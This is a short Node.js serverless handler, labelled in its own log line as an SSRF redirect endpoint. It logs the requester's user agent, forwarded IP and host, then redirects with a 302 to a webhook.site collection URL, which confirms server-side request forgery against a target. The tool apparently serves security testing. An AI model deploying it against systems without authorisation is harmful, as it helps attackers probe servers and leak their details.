module.exports = (req, res) => {
  console.log("Incoming request to SSRF redirect endpoint");
  console.log("UA:", req.headers["user-agent"]);
  console.log("IP:", req.headers["x-forwarded-for"]);
  console.log("Host:", req.headers["host"]);

  res.statusCode = 302;
  res.setHeader(
    "Location",
    "https://webhook.site/78c7d51c-b90c-44ab-8366-b88919abb9a7"
  );
  res.end("Redirecting...");
};
